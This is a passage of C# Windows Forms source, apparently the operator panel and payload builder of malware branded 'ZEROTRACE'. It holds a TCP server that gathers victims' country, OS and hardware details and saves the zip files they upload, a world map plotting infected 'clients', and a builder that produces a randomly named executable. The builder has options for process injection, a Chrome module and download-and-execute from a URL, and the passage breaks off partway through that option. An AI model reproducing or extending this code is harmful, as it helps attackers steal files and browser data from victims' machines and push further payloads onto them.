                if (clientsTable != null && clientsTable.Rows.Count > 0)
                {
                    // Get country column index
                    int countryColumnIndex = clientsTable.Columns.IndexOf("Country");

                    if (countryColumnIndex >= 0)
                    {
                        // Group by country in one pass
                        var query = clientsTable.AsEnumerable()
                            .GroupBy(row => row.Field<string>(countryColumnIndex).Trim())
                            .Select(g => new { Country = g.Key, Count = g.Count() });

                        // Process the grouped results
                        foreach (var group in query)
                        {
                            string country = group.Country;
                            int count = group.Count;

                            // Check if this is a tracked country
                            if (countryCounts.ContainsKey(country))
                            {
                                countryCounts[country] = count;
                            }
                            else
                            {
                                // Add to "Other" count
                                countryCounts["Other"] += count;
                            }
                        }
                    }
                }

                // Update the label controls with counts
                uscount.Text = countryCounts["USA"].ToString();
                italycount.Text = countryCounts["Italy"].ToString();
                canadacount.Text = countryCounts["Canada"].ToString();
                germanycount.Text = countryCounts["Germany"].ToString();
                romaniacount.Text = countryCounts["Romania"].ToString();
                swedencount.Text = countryCounts["Sweden"].ToString();
                label158.Text = countryCounts["Denmark"].ToString(); // Denmark
                label24.Text = countryCounts["France"].ToString(); // France
                label10.Text = countryCounts["China"].ToString(); // China
                ukrainecount.Text = countryCounts["Ukraine"].ToString();
                label149.Text = countryCounts["Japan"].ToString(); // Japan
                label152.Text = countryCounts["Vietnam"].ToString(); // Vietnam
                label155.Text = countryCounts["Turkey"].ToString(); // Turkey
                label146.Text = countryCounts["India"].ToString(); // India

                // For Brazil, combine both spellings
                label131.Text = (countryCounts["Brasil"] + countryCounts["Brazil"]).ToString(); // Brasil

                label134.Text = countryCounts["Spain"].ToString(); // Spain
                label137.Text = countryCounts["Portugal"].ToString(); // Portugal
                label140.Text = countryCounts["Argentina"].ToString(); // Argentina
                label143.Text = countryCounts["Mexico"].ToString(); // Mexico
                label161.Text = countryCounts["Nigeria"].ToString(); // Nigeria
                label164.Text = countryCounts["Other"].ToString(); // Other
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating country stats: {ex.Message}");
            }
        }
        private void SetupMapControl()
        {
            // Clear any existing layers
            mapControl1.Layers.Clear();

            // Set map background color
            mapControl1.BackColor = Color.FromArgb(26, 26, 26);

            try
            {
                // Add base layer (world map)
                ImageLayer baseLayer = new ImageLayer();
                OpenStreetMapDataProvider osmProvider = new OpenStreetMapDataProvider();
                baseLayer.DataProvider = osmProvider;
                mapControl1.Layers.Add(baseLayer);

                // Add vector layer for world borders from shapefile
                VectorItemsLayer worldLayer = new VectorItemsLayer();
                mapControl1.Layers.Add(worldLayer);

                // Set up shapefile
                string shapePath = Path.Combine(Application.StartupPath, "world-administrative-boundaries.shp");
                if (File.Exists(shapePath))
                {
                    ShapefileDataAdapter adapter = new ShapefileDataAdapter();
                    adapter.FileUri = new Uri("file:///" + shapePath.Replace('\\', '/'));
                    worldLayer.Data = adapter;
                }

                // Create layer for client markers
                clientsLayer = new VectorItemsLayer();
                mapControl1.Layers.Add(clientsLayer);

                // Initialize storage for client markers
                MapItemStorage storage = new MapItemStorage();
                clientsLayer.Data = storage;

                // Set initial map view
                mapControl1.ZoomLevel = 2;
                mapControl1.CenterPoint = new GeoPoint(20, 0); // Center on equator

                // Enable navigation
                mapControl1.EnableScrolling = true;
                mapControl1.EnableZooming = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error setting up map: " + ex.Message);
            }
        }

        // Method to add a client to the grid and map
        private void AddClient(string ip, string country, string os, string gpu, string cpu,
                      bool exists1 = false, bool exists2 = false, bool exists3 = false)
        {
            // Must run on UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(() => AddClient(ip, country, os, gpu, cpu, exists1, exists2, exists3)));
                return;
            }

            try
            {
                // Add to grid
                DataRow row = clientsTable.NewRow();
                row["IP"] = ip;
                row["Country"] = country;
                row["OS"] = os;
                row["GPU"] = gpu;
                row["CPU"] = cpu;
                row["Exists1"] = exists1;
                row["Exists2"] = exists2;
                row["Exists3"] = exists3;

                clientsTable.Rows.Add(row);

                // Add to map
                AddClientToMap(ip, country, exists1, exists2, exists3);

                // Update country stats
                UpdateCountryStats();

                // Update total client count on label2
                label2.Text = clientsTable.Rows.Count.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client: {ex.Message}");
            }
        }
        private void SetupCountryStatsTimer()
        {
            System.Windows.Forms.Timer statsTimer = new System.Windows.Forms.Timer();
            statsTimer.Interval = 10000; // Refresh every 10 seconds 
            statsTimer.Tick += (s, e) => UpdateCountryStats();
            statsTimer.Start();
        }

        private void AddClientToMap(string ip, string country, bool exists1, bool exists2, bool exists3)
        {
            try
            {
                // Get location for client (using both IP and country now)
                GeoPoint location = GetLocationForClient(ip, country);

                if (location != null && clientsLayer?.Data is MapItemStorage storage)
                {
                    // Create bubble for client
                    MapBubble bubble = new MapBubble();
                    bubble.Location = location;
                    bubble.Tag = ip;

                    // Size based on features
                    int existsCount = (exists1 ? 1 : 0) + (exists2 ? 1 : 0) + (exists3 ? 1 : 0);
                    bubble.Size = 5 + (existsCount * 5);

                    // Color based on country
                    bubble.Fill = GetColorForCountry(country);
                    bubble.Stroke = Color.White;
                    bubble.StrokeWidth = 1;

                    // Add to map
                    storage.Items.Add(bubble);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client to map: {ex.Message}");
            }
        }

        private GeoPoint GetLocationForClient(string ip, string country)
        {
            // Generate a unique key for this client
            string clientKey = $"{country}_{ip}";

            // Check if we already have a location for this specific client
            if (locationCache.ContainsKey(clientKey))
                return locationCache[clientKey];

            // Get base location for the country
            GeoPoint baseLocation = GetBaseLocationForCountry(country);

            // Create a random offset based on IP address to spread out clients
            // We'll use the IP as a seed for the random number generator
            int ipSeed = ip.GetHashCode();
            Random random = new Random(ipSeed);

            // Generate offset (roughly within a 100-200 mile radius)
            // 0.5-1.5 degrees is approximately 30-100 miles depending on latitude
            double latOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees
            double lonOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees

            // Apply the offset to create a unique but close location
            GeoPoint clientLocation = new GeoPoint(
                baseLocation.Latitude + latOffset,
                baseLocation.Longitude + lonOffset
            );

            // Cache this client's specific location
            locationCache[clientKey] = clientLocation;
            return clientLocation;
        }

        // Method to get the base country location
        private GeoPoint GetBaseLocationForCountry(string country)
        {
            // If we have a base country location cached, return it
            string countryKey = "base_" + country;
            if (locationCache.ContainsKey(countryKey))
                return locationCache[countryKey];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                case "brasil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                // Added these countries
                case "italy":
                    location = new GeoPoint(41.9028, 12.4964); // Rome
                    break;
                case "spain":
                    location = new GeoPoint(40.4168, -3.7038); // Madrid
                    break;
                case "portugal":
                    location = new GeoPoint(38.7223, -9.1393); // Lisbon
                    break;
                case "sweden":
                    location = new GeoPoint(59.3293, 18.0686); // Stockholm
                    break;
                case "denmark":
                    location = new GeoPoint(55.6761, 12.5683); // Copenhagen
                    break;
                case "norway":
                    location = new GeoPoint(59.9139, 10.7522); // Oslo
                    break;
                case "finland":
                    location = new GeoPoint(60.1699, 24.9384); // Helsinki
                    break;
                case "poland":
                    location = new GeoPoint(52.2297, 21.0122); // Warsaw
                    break;
                case "ukraine":
                    location = new GeoPoint(50.4501, 30.5234); // Kyiv
                    break;
                case "romania":
                    location = new GeoPoint(44.4268, 26.1025); // Bucharest
                    break;
                case "turkey":
                    location = new GeoPoint(41.0082, 28.9784); // Istanbul
                    break;
                case "australia":
                    location = new GeoPoint(-33.8688, 151.2093); // Sydney
                    break;
                case "argentina":
                    location = new GeoPoint(-34.6037, -58.3816); // Buenos Aires
                    break;
                case "mexico":
                    location = new GeoPoint(19.4326, -99.1332); // Mexico City
                    break;
                case "vietnam":
                    location = new GeoPoint(21.0278, 105.8342); // Hanoi
                    break;
                default:
                    // For unknown countries, instead of completely random placement,
                    // let's try to place them in a reasonable continent-based area

                    // Create a deterministic but consistent seed
                    Random random = new Random(country.GetHashCode());

                    // Determine if the country might be in Europe (a common case for many countries)
                    bool mightBeEuropean = false;
                    foreach (string ending in new[] { "ia", "land", "stan", "any", "ark", "ary", "way" })
                    {
                        if (country.ToLower().EndsWith(ending))
                        {
                            mightBeEuropean = true;
                            break;
                        }
                    }

                    double lat, lon;

                    if (mightBeEuropean)
                    {
                        // European bounds - rough approximation
                        lat = 40.0 + (random.NextDouble() * 20); // 40 to 60 degrees north
                        lon = -5.0 + (random.NextDouble() * 40); // -5 to 35 degrees east
                    }
                    else
                    {
                        // Worldwide, but avoid extreme polar regions
                        lat = (random.NextDouble() * 140) - 70; // -70 to 70
                        lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    }

                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the base location
            locationCache[countryKey] = location;
            return location;
        }
        private GeoPoint GetLocationForCountry(string country)
        {
            // Cache lookup
            if (locationCache.ContainsKey(country))
                return locationCache[country];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                default:
                    // Random but consistent location for unknown countries
                    Random random = new Random(country.GetHashCode());
                    double lat = (random.NextDouble() * 170) - 85; // -85 to 85
                    double lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the result
            locationCache[country] = location;
            return location;
        }

        private Color GetColorForCountry(string country)
        {
            // Grayscale colors by country
            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    return Color.FromArgb(240, 240, 240); // Almost white
                case "china":
                    return Color.FromArgb(210, 210, 210);
                case "russia":
                    return Color.FromArgb(190, 190, 190);
                case "germany":
                    return Color.FromArgb(170, 170, 170);
                case "uk":
                case "united kingdom":
                    return Color.FromArgb(150, 150, 150);
                case "france":
                    return Color.FromArgb(130, 130, 130);
                case "japan":
                    return Color.FromArgb(110, 110, 110);
                case "brazil":
                    return Color.FromArgb(90, 90, 90);
                case "india":
                    return Color.FromArgb(70, 70, 70);
                case "canada":
                    return Color.FromArgb(50, 50, 50); // Almost black
                default:
                    return Color.FromArgb(180, 180, 180); // Medium gray
            }
        }
        private System.Windows.Forms.Timer resourceMonitorTimer;
        private PerformanceCounter cpuCounter;
        private PerformanceCounter ramCounter;
        private PerformanceCounter diskCounter;
        private void SetupResourceMonitor()
        {
            try
            {
                // Initialize performance counters
                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                ramCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
                diskCounter = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");

                // First read (first read is usually 0)
                cpuCounter.NextValue();
                ramCounter.NextValue();
                diskCounter.NextValue();

                // Small delay for more accurate first reading
                Thread.Sleep(1000);

                // Set up timer for periodic updates
                resourceMonitorTimer = new System.Windows.Forms.Timer();
                resourceMonitorTimer.Interval = 2000; // Update every 2 seconds
                resourceMonitorTimer.Tick += ResourceMonitorTimer_Tick;
                resourceMonitorTimer.Start();

                // Get initial values
                UpdateResourceLabels();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error setting up resource monitor: {ex.Message}");
                // Set default values if counters fail
                label39.Text = "CPU: ---%";
                label40.Text = "RAM: ---%";
                label42.Text = "Disk: ---%";
            }
        }

        private void ResourceMonitorTimer_Tick(object sender, EventArgs e)
        {
            UpdateResourceLabels();
        }

        private void UpdateResourceLabels()
        {
            try
            {
                // Get current values
                float cpuUsage = cpuCounter.NextValue();
                float ramUsage = ramCounter.NextValue();
                float diskUsage = diskCounter.NextValue();

                // Update labels
                // CPU usage
                label39.Text = $"{cpuUsage:0}%";

                // RAM usage
                label40.Text = $"{ramUsage:0}%";

                // Disk usage
                label42.Text = $"{diskUsage:0}%";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating resource labels: {ex.Message}");
            }
        }

        // Clean up resources when form closes
        private void CleanupResourceMonitor()
        {
            if (resourceMonitorTimer != null)
            {
                resourceMonitorTimer.Stop();
                resourceMonitorTimer.Dispose();
            }

            if (cpuCounter != null)
                cpuCounter.Dispose();

            if (ramCounter != null)
                ramCounter.Dispose();

            if (diskCounter != null)
                diskCounter.Dispose();
        }
        #region TCP Server Implementation

        private void StartServer(int port)
        {
            try
            {
                LogToMonitor($"Starting server on port {port}...", LogType.System);

                // Create a new thread for the server
                serverThread = new Thread(() => RunServer(port));
                serverThread.IsBackground = true;
                serverThread.Start();
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error starting server: {ex.Message}", LogType.Error);
                MessageBox.Show("Error starting server: " + ex.Message);
            }
        }
        private void StopServer()
        {
            try
            {
                // Signal server to stop
                isServerRunning = false;

                // Force TcpListener to stop
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }

                // Wait for server thread to terminate
                if (serverThread != null && serverThread.IsAlive)
                {
                    // Give it a short time to clean up
                    serverThread.Join(1000);

                    // If it's still running, abort it (not recommended but a fallback)
                    if (serverThread.IsAlive)
                    {
                        try
                        {
                            serverThread.Interrupt();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error stopping server thread: {ex.Message}");
                        }
                    }
                }

                Console.WriteLine("Server stopped");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping server: {ex.Message}");
                throw;
            }
        }
        private void RunServer(int port)
        {
            try
            {
                // Start TCP listener on the specified port
                tcpServer = new TcpListener(System.Net.IPAddress.Any, port);
                tcpServer.Start();

                isServerRunning = true;
                LogToMonitor($"Server started successfully on port {port}", LogType.System);
                LogToMonitor("Waiting for client connections...", LogType.Info);

                // Accept clients in a loop
                while (isServerRunning)
                {
                    try
                    {
                        // Accept client connection with timeout
                        tcpServer.Server.Poll(1000000, SelectMode.SelectRead); // 1 second timeout

                        if (!isServerRunning)
                            break;

                        // Check if there are pending connections
                        if (tcpServer.Pending())
                        {
                            System.Net.Sockets.TcpClient client = tcpServer.AcceptTcpClient();
                            string clientIp = ((System.Net.IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                            LogToMonitor($"Client connected: {clientIp}", LogType.Connection);

                            // Handle client in a new thread
                            Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClient));
                            clientThread.IsBackground = true;
                            clientThread.Start(client);
                        }
                    }
                    catch (System.Net.Sockets.SocketException)
                    {
                        // Check if we're still supposed to run
                        if (!isServerRunning)
                            break;
                    }
                    catch (ThreadInterruptedException)
                    {
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                LogToMonitor($"Server error: {ex.Message}", LogType.Error);
            }
            finally
            {
                // Clean up
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }
                isServerRunning = false;
                LogToMonitor("Server stopped", LogType.System);
            }
        }

        private void HandleClient(object obj)
        {
            System.Net.Sockets.TcpClient tcpClient = (System.Net.Sockets.TcpClient)obj;
            System.Net.Sockets.NetworkStream stream = tcpClient.GetStream();
            System.IO.FileStream fileStream = null;
            string clientIp = "unknown";

            try
            {
                // Get client IP
                clientIp = ((System.Net.IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                LogToMonitor($"Processing client connection: {clientIp}", LogType.Connection);

                // Create Clients directory if it doesn't exist
                string clientsDir = System.IO.Path.Combine(Application.StartupPath, "Clients");
                if (!System.IO.Directory.Exists(clientsDir))
                    System.IO.Directory.CreateDirectory(clientsDir);

                // Create directory for this specific client
                string clientDir = System.IO.Path.Combine(clientsDir, clientIp.Replace('.', '_'));
                if (!System.IO.Directory.Exists(clientDir))
                    System.IO.Directory.CreateDirectory(clientDir);

                // Buffer for reading data
                byte[] buffer = new byte[8192];
                int bytesRead;

                // State tracking
                bool receivingClientData = true;
                bool receivingFile = false;
                long fileSize = 0;
                long receivedBytes = 0;
                string clientData = null;
                string currentFileName = null;

                // Read data from client
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    if (receivingClientData)
                    {
                        // Convert received data to string
                        string data = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        LogToMonitor($"Received {bytesRead} bytes of initial data from {clientIp}", LogType.DataTransfer);

                        // Check if this is client data
                        if (data.StartsWith("DATA:"))
                        {
                            // Extract client info
                            clientData = data.Substring(5); // Skip "DATA:" prefix
                            LogToMonitor($"Client data received from {clientIp}", LogType.DataTransfer);

                            // Parse client data and add to grid
                            ParseClientDataAndAddToGrid(clientIp, clientData);

                            // Check if rest of data contains file header
                            int fileHeaderIndex = data.IndexOf("FILE:");
                            if (fileHeaderIndex >= 0)
                            {
                                // Switch to file receiving mode
                                receivingClientData = false;
                                receivingFile = true;

                                // Parse file header (format: FILE:size:)
                                string headerPart = data.Substring(fileHeaderIndex + 5);
                                int sizeEndIndex = headerPart.IndexOf(':');
                                if (sizeEndIndex > 0)
                                {
                                    string fileSizeStr = headerPart.Substring(0, sizeEndIndex);
                                    if (long.TryParse(fileSizeStr, out fileSize))
                                    {
                                        currentFileName = $"{clientIp}_{DateTime.Now:yyyyMMdd_HHmmss}.zip";
                                        LogToMonitor($"Starting file transfer from {clientIp}: {currentFileName}, size: {FormatFileSize(fileSize)}", LogType.DataTransfer);

                                        // Create file to save data
                                        string filePath = System.IO.Path.Combine(clientDir, currentFileName);
                                        fileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Create, System.IO.FileAccess.Write);

                                        // Write file data part (after the header)
                                        string fileDataPart = headerPart.Substring(sizeEndIndex + 1);
                                        byte[] fileDataBytes = System.Text.Encoding.UTF8.GetBytes(fileDataPart);
                                        fileStream.Write(fileDataBytes, 0, fileDataBytes.Length);
                                        receivedBytes += fileDataBytes.Length;

                                        // Log progress at 10% intervals to avoid log spam
                                        LogFileProgress(clientIp, currentFileName, receivedBytes, fileSize);
                                    }
                                }
                            }
                        }
                        else if (data.StartsWith("FILE:"))
                        {
                            // Direct file transfer without client data first
                            receivingClientData = false;
                            receivingFile = true;

                            // Parse file header (format: FILE:size:)
                            string headerPart = data.Substring(5);
                            int sizeEndIndex = headerPart.IndexOf(':');
                            if (sizeEndIndex > 0)
                            {
                                string fileSizeStr = headerPart.Substring(0, sizeEndIndex);
                                if (long.TryParse(fileSizeStr, out fileSize))
                                {
                                    currentFileName = $"{clientIp}_{DateTime.Now:yyyyMMdd_HHmmss}.zip";
                                    LogToMonitor($"Starting direct file transfer from {clientIp}: {currentFileName}, size: {FormatFileSize(fileSize)}", LogType.DataTransfer);

                                    // Create file to save data
                                    string filePath = System.IO.Path.Combine(clientDir, currentFileName);
                                    fileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Create, System.IO.FileAccess.Write);

                                    // Write file data part (after the header)
                                    string fileDataPart = headerPart.Substring(sizeEndIndex + 1);
                                    byte[] fileDataBytes = System.Text.Encoding.UTF8.GetBytes(fileDataPart);
                                    fileStream.Write(fileDataBytes, 0, fileDataBytes.Length);
                                    receivedBytes += fileDataBytes.Length;

                                    // Log progress at 10% intervals
                                    LogFileProgress(clientIp, currentFileName, receivedBytes, fileSize);
                                }
                            }
                        }
                    }
                    else if (receivingFile)
                    {
                        // Write received data to file
                        fileStream.Write(buffer, 0, bytesRead);
                        receivedBytes += bytesRead;

                        // Log progress at 10% intervals to avoid log spam
                        LogFileProgress(clientIp, currentFileName, receivedBytes, fileSize);

                        // Check if file transfer is complete
                        if (receivedBytes >= fileSize)
                        {
                            LogToMonitor($"File transfer from {clientIp} complete: {currentFileName} ({FormatFileSize(fileSize)})", LogType.DataTransfer);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error handling client {clientIp}: {ex.Message}", LogType.Error);
            }
            finally
            {
                // Clean up resources
                if (fileStream != null)
                {
                    fileStream.Flush();
                    fileStream.Close();
                }

                stream.Close();
                tcpClient.Close();
                LogToMonitor($"Client disconnected: {clientIp}", LogType.Connection);
            }
        }



        private long lastLoggedPercentage = 0;
        private void LogFileProgress(string clientIp, string fileName, long receivedBytes, long totalBytes)
        {
            if (totalBytes <= 0)
                return;

            int percentage = (int)((receivedBytes * 100) / totalBytes);

            // Only log at 10% intervals or completion
            if (percentage == 100 || percentage - lastLoggedPercentage >= 10)
            {
                lastLoggedPercentage = percentage;
                LogToMonitor($"File transfer progress from {clientIp}: {percentage}% ({FormatFileSize(receivedBytes)} of {FormatFileSize(totalBytes)})", LogType.DataTransfer);
            }

            // Reset last logged percentage when file transfer completes
            if (percentage == 100)
                lastLoggedPercentage = 0;
        }

        private string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return String.Format("{0:0.##} {1}", len, sizes[order]);
        }



        private void ParseClientDataAndAddToGrid(string clientIp, string data)
        {
            try
            {
                // Parse client info - format: Country|OS|GPU|CPU|Exists1|Exists2|Exists3
                string[] parts = data.Split('|');

                if (parts.Length >= 7)
                {
                    string country = parts[0];
                    string os = parts[1];
                    string gpu = parts[2];
                    string cpu = parts[3];
                    bool exists1 = parts[4] == "1";
                    bool exists2 = parts[5] == "1";
                    bool exists3 = parts[6] == "1";

                    // Add client to UI (must be on UI thread)
                    Invoke(new Action(() => {
                        // Add to grid and map
                        AddClient(clientIp, country, os, gpu, cpu, exists1, exists2, exists3);

                        // Update client count
                        UpdateClientCount();
                    }));

                    Console.WriteLine($"Added client: {clientIp} from {country}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing client data: {ex.Message}");
            }
        }
        private void UpdateClientCount()
        {
            // Ensure we run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateClientCount));
                return;
            }

            // Update the client count display
            label2.Text = clientsTable.Rows.Count.ToString();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Stop server when form is closing
            isServerRunning = false;
            if (tcpServer != null)
            {
                tcpServer.Stop();
            }

            base.OnFormClosing(e);
        }

        #endregion

      
        private void panelControl4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton3_Click(object sender, EventArgs e)
        {
          
        }
        private void UpdatePortsLabel()
        {
           
        }
        private void simpleButton1_Click(object sender, EventArgs e)
        {
            if (isServerRunning)
            {
                MessageBox.Show("Server is already running!");
                return;
            }
            try
            {
                // Get port from textEdit1
                if (!int.TryParse(textEdit1.Text, out int port))
                {
                    MessageBox.Show("Please enter a valid port number!");
                    return;
                }
                // Validate port number
                if (port < 1 || port > 65535)
                {
                    MessageBox.Show("Port must be between 1 and 65535!");
                    return;
                }

                // Clear log before starting server
                richTextBox1.Clear();
                LogToMonitor($"Starting server on port {port}...", LogType.System);

                // Start server with the specified port
                StartServer(port);
                label45.Text = port.ToString();

                MessageBox.Show("Your server is running on port " + port.ToString(),
                "Server Information",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information);

                // Update UI
                simpleButton1.Enabled = false;
                simpleButton2.Enabled = true;
                textEdit1.Enabled = false;
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error starting server: {ex.Message}", LogType.Error);
                MessageBox.Show("Error starting server: " + ex.Message);
            }
        }

        private void simpleButton2_Click(object sender, EventArgs e)
        {
            // Stop listening
    if (!isServerRunning)
    {
        MessageBox.Show("Server is not running!");
        return;
    }
    
    try
    {
        LogToMonitor("Stopping server...", LogType.System);
        StopServer();
              

        // Update UI
        simpleButton1.Enabled = true;
        simpleButton2.Enabled = false;
        textEdit1.Enabled = true;
        
        LogToMonitor("Server stopped", LogType.System);
                label45.Text = "0";
            }
    catch (Exception ex)
    {
        LogToMonitor($"Error stopping server: {ex.Message}", LogType.Error);
        MessageBox.Show("Error stopping server: " + ex.Message);
    }
        }

        private void panelControl13_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelControl23_Paint(object sender, PaintEventArgs e)
        {

        }

        public class RandomStringGenerator
        {
            private static readonly char[] chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

            public static string Generate(int length)
            {
                var random = new Random();
                var result = new StringBuilder(length);
                for (int i = 0; i < length; i++)
                {
                    result.Append(chars[random.Next(chars.Length)]);
                }
                return result.ToString();
            }
        }
        public  string output = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + RandomStringGenerator.Generate(16) + ".exe";
        private string OpenFileDialogIcon = string.Empty;
        string storedLink = string.Empty;
        private void simpleButton6_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear the terminal
                richTextBox2.Clear();

                // Initialize with a styled header
                AppendColoredText(richTextBox2, "╔══════════════════════════════════════╗\n", Color.Cyan);
                AppendColoredText(richTextBox2, "║        ZEROTRACE BUILD PROCESS        ║\n", Color.White);
                AppendColoredText(richTextBox2, "╚══════════════════════════════════════╝\n\n", Color.Cyan);

                // Validate inputs
                AppendColoredText(richTextBox2, "⚙️ Validating inputs...\n", Color.Yellow);

                if (string.IsNullOrWhiteSpace(textEdit4.Text) || string.IsNullOrWhiteSpace(textEdit3.Text))
                {
                    AppendColoredText(richTextBox2, "❌ ERROR: IP and Port must be specified.\n", Color.Red);
                    MessageBox.Show("IP and Port must be specified.");
                    return;
                }

                AppendColoredText(richTextBox2, "✓ IP: ", Color.LightGreen);
                AppendColoredText(richTextBox2, $"{textEdit4.Text}\n", Color.White);

                // Try to parse port to validate it
                if (!int.TryParse(textEdit3.Text, out int port))
                {
                    AppendColoredText(richTextBox2, "❌ ERROR: Port must be a valid number.\n", Color.Red);
                    MessageBox.Show("Port must be a valid number.");
                    return;
                }

                AppendColoredText(richTextBox2, "✓ Port: ", Color.LightGreen);
                AppendColoredText(richTextBox2, $"{port}\n", Color.White);

                // Generate a new random output filename
                AppendColoredText(richTextBox2, "⚙️ Generating output filename...\n", Color.Yellow);
                string output = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" +
                              RandomStringGenerator.Generate(16) + ".exe";
                AppendColoredText(richTextBox2, "✓ Output: ", Color.LightGreen);
                AppendColoredText(richTextBox2, $"{output}\n", Color.White);

                // Handle injection option
                string injValue = "0";
                if (checkEdit1.Checked)
                {
                    injValue = "1";
                    AppendColoredText(richTextBox2, "✓ Injection: ", Color.LightGreen);
                    AppendColoredText(richTextBox2, "ENABLED\n", Color.OrangeRed);
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Injection: ", Color.LightGreen);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }

                // Handle Chrome option
                string chrome = "0";
                if (checkEdit2.Checked)
                {
                    chrome = "1";
                    AppendColoredText(richTextBox2, "✓ Chrome Module: ", Color.LightGreen);
                    AppendColoredText(richTextBox2, "ENABLED\n", Color.OrangeRed);
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Chrome Module: ", Color.LightGreen);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }

                // Handle Download & Execute option
                string downloadexecute = "0";
                if (checkEdit3.Checked)
                {
                    AppendColoredText(richTextBox2, "⚙️ Configuring Download & Execute...\n", Color.Yellow);
                    using (Form prompt = new Form())
                    {
                        prompt.Width = 400;
                        prompt.Height = 150;
                        prompt.Text = "Enter a URL";
                        prompt.ShowIcon = false;  // Disable the icon
                        prompt.FormBorderStyle = FormBorderStyle.FixedDialog;  // Make dialog non-resizable
                        prompt.MaximizeBox = false;  // Disable maximize button
                        prompt.MinimizeBox = false;  // Disable minimize button
                        prompt.StartPosition = FormStartPosition.CenterScreen;  // Center on screen

                        Label textLabel = new Label() { Left = 10, Top = 20, Text = "Enter HTTP or HTTPS link:", AutoSize = true };
                        TextBox inputBox = new TextBox() { Left = 10, Top = 50, Width = 360 };
                        Button confirmation = new Button() { Text = "OK", Left = 300, Width = 70, Top = 80 };
                        confirmation.DialogResult = DialogResult.OK;

                        prompt.Controls.Add(textLabel);
                        prompt.Controls.Add(inputBox);
                        prompt.Controls.Add(confirmation);
                        prompt.AcceptButton = confirmation;

                        if (prompt.ShowDialog() == DialogResult.OK)
                        {
                            string input = inputBox.Text;
                            if (Uri.IsWellFormedUriString(input, UriKind.Absolute) &&
                                (input.StartsWith("http://") || input.StartsWith("https://")))
                            {
                                downloadexecute = input;
